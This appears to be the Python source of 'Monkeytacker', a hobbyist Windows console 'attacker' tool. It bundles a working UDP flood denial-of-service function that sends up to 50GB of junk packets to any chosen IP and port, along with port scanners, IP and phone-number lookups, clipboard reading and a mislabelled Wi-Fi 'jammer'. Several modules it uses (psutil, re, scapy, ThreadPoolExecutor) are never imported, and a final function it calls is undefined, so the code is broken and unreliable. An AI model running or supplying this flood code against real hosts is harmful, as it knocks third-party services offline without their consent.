import os
import socket
import threading
import time
from faker import Faker
import ctypes
import sys
import platform
import requests
import subprocess
import win32console

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

clear_screen()

win32console.SetConsoleTitle("Monkeytacker | Version: 4.0 | dsc.gg/wearentdevs | Made by Sempiller")

clear_screen()

def startup_text():
    stext = """
https://dsc.gg/wearentdevs
    """
    print(stext)


startup_text()

time.sleep(2)

fake = Faker()



def jam_wifi():
    print("Jamming Connected Wi-Fi..")
    os.system("netsh wlan disconnect")

def gen_checker():
    print("Only for mobile verisons, android supported!")

def show_help():
    help_menu = """
dos - denial of service attack, ex: dos 206.212.246.14:53
sdos - stops the denial of service attack, ex: sdos
ping - ping a site, ex: ping 206.212.246.14
cport - check the port of site, ex: cport 206.212.246.14 22,53,80,25655
ipinfo - check IP address's details, ex: ipinfo 206.212.246.14
phoneinfo - check phone number's details, ex: phoneinfo 323 720 41 88
ipgen - generate a fake IP, ex: ipgen
wifidetails - show Wi-Fi details, ex: wifidetails
devices - see whos on your wifi ex: devices
traceroute - trace the route to a host, ex: traceroute www.google.com
dnslookup - DNS lookup for a domain, ex: dnslookup www.google.com
maclookup - lookup MAC address details, ex: maclookup 00:1A:2B:3C:4D:5E
sysmon - start system resource monitor
ports - start advanced port scanner, ex: ports 206.212.246.14 20 80
httpanalyze - analyze HTTP requests and responses, ex: httpanalyze www.example.com
clipboard - show clipboard content
password - check password strength, ex: password myP@ssw0rd!
jammer - Jam connected Wi-Fi ex: jammer
exit - close the code, ex: exit
"""
    print(help_menu)

def yellow_to_red_gradient(text):
    gradient_text = ""
    start_color = [114, 27, 101]
    end_color = [255, 216, 104]

    gradient_steps = len(text)
    step_r = (end_color[0] - start_color[0]) / gradient_steps
    step_g = (end_color[1] - start_color[1]) / gradient_steps
    step_b = (end_color[2] - start_color[2]) / gradient_steps

    for char_index, char in enumerate(text):
        r = int(start_color[0] + step_r * char_index)
        g = int(start_color[1] + step_g * char_index)
        b = int(start_color[2] + step_b * char_index)
        gradient_text += f"\033[38;2;{r};{g};{b}m{char}"

    return gradient_text

def dos_attack(target_ip, target_port):
    global attack_running
    PAYLOAD_SIZE = 1024
    TOTAL_SIZE_GB = 50
    TOTAL_SIZE_BYTES = TOTAL_SIZE_GB * 1024 * 1024 * 1024  # 50GB

    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b'X' * PAYLOAD_SIZE
    sent_bytes = 0

    while sent_bytes < TOTAL_SIZE_BYTES and attack_running:
        sock.sendto(payload, (target_ip, target_port))
        sent_bytes += PAYLOAD_SIZE

    sock.close()

def start_dos_attack(command):
    global attack_running
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format. Please enter in the format 'dos <IP>:<PORT>'")

        target_info = parts[1].split(":")
        if len(target_info) != 2:
            raise ValueError("Invalid target format. Please enter in the format 'IP:PORT'")

        target_ip = target_info[0]
        target_port = int(target_info[1])

        attack_running = True

        dos_thread = threading.Thread(target=dos_attack, args=(target_ip, target_port))
        dos_thread.start()

        print("[M] Attack started")
    except ValueError as ve:
        print("[M] You have entered wrong IP or Port")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def ping_ip(target_ip):
    ping_command = f"ping {target_ip} -n 4"
    response = os.popen(ping_command).read()
    print(response)

def start_ping_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        ip = parts[1]
        ping_ip(ip)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def check_open_ports(ip, ports):
    open_ports = []
    try:
        for port_str in ports.split(","):
            port = int(port_str)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(2)
            result = sock.connect_ex((ip, port))
            if result == 0:
                open_ports.append(port)
            sock.close()

        if len(open_ports) > 0:
            print(f"[M] The following ports are open on {ip}: {', '.join(map(str, open_ports))}")
        else:
            print(f"[M] No open ports found on {ip}")
    except ValueError:
        print("[M] Invalid port format. Please enter comma-separated port numbers.")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def show_devices():
    try:
        if os.name == 'nt':
            result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
            print(result.stdout)
        elif os.name == 'posix':
            result = subprocess.run(['arp', '-n'], capture_output=True, text=True)
            print(result.stdout)
        else:
            print("[M] 'devices' command is not supported on this platform.")
    except Exception as e:
        print(f"[M] An error occurred while fetching devices: {e}")

def get_ip_info(ip):
    try:
        url = f"http://ip-api.com/json/{ip}"
        response = requests.get(url)
        data = response.json()

        if data["status"] == "success":
            print("[M] IP Address Details:")
            print(f"IP Address: {data['query']}")
            print(f"Country: {data['country']}")
            print(f"City: {data['city']}")
            print(f"ISP: {data['isp']}")
            print(f"Latitude: {data['lat']}")
            print(f"Longitude: {data['lon']}")
            print(f"AS: {data['as']}")
        else:
            print(f"[M] Unable to fetch details for IP address: {ip}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def get_phone_info(phone_number):
    try:
        url = f"http://apilayer.net/api/validate?access_key=your_access_key&number={phone_number}&country_code="
        response = requests.get(url)
        data = response.json()

        if data["valid"]:
            print("[M] Phone Number Details:")
            print(f"Phone Number: {data['international_format']}")
            print(f"Country Prefix: {data['country_prefix']}")
            print(f"Country Code: {data['country_code']}")
            print(f"Country Name: {data['country_name']}")
            print(f"Location: {data['location']}")
            print(f"Carrier: {data['carrier']}")
        else:
            print(f"[M] Unable to fetch details for phone number: {phone_number}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def show_system_stats():
    print("CPU Usage: ", psutil.cpu_percent(interval=1), "%")
    print("Memory Usage: ", psutil.virtual_memory().percent, "%")
    print("Disk Usage: ", psutil.disk_usage('/').percent, "%")
    print("Network Stats: ", psutil.net_io_counters())

def start_system_monitor():
    try:
        while True:
            show_system_stats()
            time.sleep(5)
    except KeyboardInterrupt:
        print("System monitor stopped.")

def scan_port(ip, port):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
        sock.settimeout(1)
        try:
            sock.connect((ip, port))
            print(f"Port {port} is open on {ip}")
        except:
            pass

def advanced_port_scanner(ip, start_port, end_port):
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in range(start_port, end_port + 1):
            executor.submit(scan_port, ip, port)

def start_port_scan_command(command):
    try:
        parts = command.split()
        if len(parts) != 4:
            raise ValueError("Invalid command format")
        ip = parts[1]
        start_port = int(parts[2])
        end_port = int(parts[3])
        advanced_port_scanner(ip, start_port, end_port)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def start_network_sniffer():
    def packet_callback(packet):
        print(packet.show())
    try:
        scapy.sniff(prn=packet_callback, store=0)
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def show_clipboard_content():
    try:
        if os.name == 'nt':
            import win32clipboard
            win32clipboard.OpenClipboard()
            data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            print("[M] Clipboard Content:", data)
        else:
            print("[M] Clipboard feature is not supported on this platform.")
    except Exception as e:
        print(f"[M] An error occurred while fetching clipboard content: {e}")

def analyze_http_requests(domain):
    try:
        response = requests.get(f"http://{domain}")
        print("[M] HTTP Request Headers:")
        print(response.request.headers)
        print("[M] HTTP Response Headers:")
        print(response.headers)
        print("[M] Response Body:")
        print(response.text[:500])  # Print first 500 characters of the response body
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def start_http_analysis_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        domain = parts[1]
        analyze_http_requests(domain)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def check_password_strength(password):
    strength_criteria = {
        'length': len(password) >= 8,
        'lowercase': re.search(r'[a-z]', password) is not None,
        'uppercase': re.search(r'[A-Z]', password) is not None,
        'digit': re.search(r'\d', password) is not None,
        'special_char': re.search(r'[@$!%*?&#]', password) is not None,
    }
    strength = sum(strength_criteria.values())
    print(f"[M] Password Strength: {strength}/5")
    if strength < 5:
        print("[M] Password suggestions:")
        if not strength_criteria['length']:
            print(" - Make the password at least 8 characters long.")
        if not strength_criteria['lowercase']:
            print(" - Include at least one lowercase letter.")
        if not strength_criteria['uppercase']:
            print(" - Include at least one uppercase letter.")
        if not strength_criteria['digit']:
            print(" - Include at least one digit.")
        if not strength_criteria['special_char']:
            print(" - Include at least one special character (@, $, !, %, *, ?, &, #).")

def generate_fake_ip():
    fake_ip = fake.ipv4()
    print(f"[M] Fake IP: {fake_ip}")

def traceroute(host):
    try:
        if os.name == 'nt':
            command = f"tracert {host}"
        else:
            command = f"traceroute {host}"
        response = os.popen(command).read()
        print(response)
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def start_traceroute_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        host = parts[1]
        traceroute(host)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def dns_lookup(domain):
    try:
        ip = socket.gethostbyname(domain)
        print(f"[M] IP address of {domain}: {ip}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def start_dnslookup_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        domain = parts[1]
        dns_lookup(domain)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def mac_lookup(mac_address):
    try:
        url = f"https://api.macvendors.com/{mac_address}"
        response = requests.get(url)
        if response.status_code == 200:
            print(f"[M] MAC address details: {response.text}")
        else:
            print(f"[M] Unable to fetch details for MAC address: {mac_address}")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

def start_maclookup_command(command):
    try:
        parts = command.split()
        if len(parts) != 2:
            raise ValueError("Invalid command format")
        mac_address = parts[1]
        mac_lookup(mac_address)
    except ValueError as ve:
        print("[M] Invalid command format")
    except Exception as e:
        print(f"[M] An error occurred: {e}")

attack_running = False
attack_bytes_sent = 0

clear_screen()

gradient_text = """
         ||                    
         ||                    Monkeytacker Free Attacker
        _;|                    > Made by Sempiller
       /__3                    > Credits to hatchinng
     / / //                    > Version: V4.0.3
      / /|| .--.               > dsc.gg/wearentdevs
     \ \// / (OO)              
      \//  |( _ )              
      // \__/`-'\__            #FuckPaidTools
     // \__      _ \           
 _.-'/    | ._._.|\ \          
(_.-'     |      \ \ \         
   .-._   /    o ) / /         
  /_ \ \ /   \__/ / /          
    \ \_/   / /  E_/           
     \     / /                 
      `-._/-'                  
 
Type 'help' for commands
"""

print(yellow_to_red_gradient(gradient_text))

while True:
    user_input = input("Monke$ >>> ")

    if user_input.lower() == "help":
        show_help()
    elif user_input.lower() == "exit":
        break
    elif user_input.lower().startswith("dos"):
        if attack_running:
            print("[M] Another attack is already running. Please wait until it completes.")
        else:
            start_dos_attack(user_input)
    elif user_input.lower().startswith("ping"):
        start_ping_command(user_input)
    elif user_input.lower().startswith("cport"):
        parts = user_input.split()
        if len(parts) != 3:
            print("[M] Invalid command format. Please enter in the format 'cport <IP> <port1,port2,...>'.")
        else:
            check_open_ports(parts[1], parts[2])
    elif user_input.lower().startswith("ipinfo"):
        parts = user_input.split()
        if len(parts) != 2:
            print("[M] Invalid command format. Please enter in the format 'ipinfo <IP>'.")
        else:
            get_ip_info(parts[1])
    elif user_input.lower().startswith("phoneinfo"):
        parts = user_input.split()
        if len(parts) != 2:
            print("[M] Invalid command format. Please enter in the format 'phoneinfo <phone_number>'.")
        else:
            get_phone_info(parts[1])
    elif user_input.lower().startswith("ipgen"):
        generate_fake_ip()
    elif user_input.lower() == "wifidetails":
        try:
            wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'interface']).decode('utf-8')
            print(wifi_info)
        except Exception as e:
            print("[M] An error occurred while fetching Wi-Fi details:", e)
    elif user_input.lower() == "sdos":
        if attack_running:
            print("[M] Stopping the DoS attack.")
            attack_running = False
        else:
            print("[M] No DoS attack is currently running.")
    elif user_input.lower() == "devices":
        show_devices()
    elif user_input.lower().startswith("traceroute"):
        start_traceroute_command(user_input)
    elif user_input.lower().startswith("dnslookup"):
        start_dnslookup_command(user_input)
    elif user_input.lower().startswith("maclookup"):
        start_maclookup_command(user_input)
    elif user_input.lower() == "sysmon":
        start_system_monitor()
    elif user_input.lower().startswith("ports"):
        start_port_scan_command(user_input)
    elif user_input.lower().startswith("httpanalyze"):
        start_http_analysis_command(user_input)
    elif user_input.lower() == "clipboard":
        show_clipboard_content()
    elif user_input.lower() == "genchecker":
        gen_checker()
    elif user_input.lower() == "jammer":
        jam_wifi()
    elif user_input.lower().startswith("password"):
        parts = user_input.split()
        if len(parts) != 2:
            print("[M] Invalid command format. Please enter in the format 'password <password>'.")
        else:
            check_password_strength(parts[1])
    else:
        print("Invalid command. Type 'help' for available commands.")

    if not attack_running and attack_bytes_sent > 0:
        print(f"[M] Attack Completed, {attack_bytes_sent / (1024 * 1024 * 1024)}GB Used for this Attack.")
        attack_bytes_sent = 0
    
if __name__ == "__main__":
    change_terminal_name()
